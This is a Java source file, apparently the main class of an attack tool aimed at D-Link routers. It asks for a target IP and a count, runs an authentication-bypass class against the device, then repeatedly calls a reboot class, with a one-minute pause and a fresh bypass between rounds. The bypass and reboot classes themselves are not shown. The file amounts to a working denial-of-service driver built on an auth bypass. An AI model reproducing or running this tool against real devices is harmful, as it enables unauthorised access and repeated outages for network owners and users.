/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package dlink;

import java.util.Scanner;

/**
 *
 * @author SUMAN
 */
public class DlinkBot {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws InterruptedException {
        // TODO code application logic here
        Scanner sc=new Scanner(System.in);
        System.out.print("Enter IP: ");
        String ip=sc.nextLine();
        System.out.println("No of Reboot: ");
        int n=sc.nextInt();
        authBypass a=new authBypass(ip);
        rebootBot b=new rebootBot(ip);
        if(a.deploy()){
        if(n==1)
        {
            System.out.println("[*]Reboot Sequence "+n);
            if(b.deploy())
                System.out.println(">>Sucess.");
            else
                System.out.println(">>Reboot Error!");
                
        }
        else
        {
            for(int i=1;i<=n;i++)
            {
                
                System.out.println("[*]Reboot Sequence "+n);
                if(b.deploy())
                    System.out.println(">>Sucess.");
                else
                {
                   System.err.println(">>Reboot Error!");
                   break;
                }
                     
                try{
                Thread.sleep(60000);  // 1 min delay
                }catch(Exception e)
                {
                    System.err.println("[*]Time error");
                    break;
                }

                if(!a.deploy())
                {
                    System.err.println("[*]Next Auth Error!");
                    break;
                }
                
            }
        }
    }
    else
       System.err.println("[*]Auth Error!");
        
        
    }
    
}
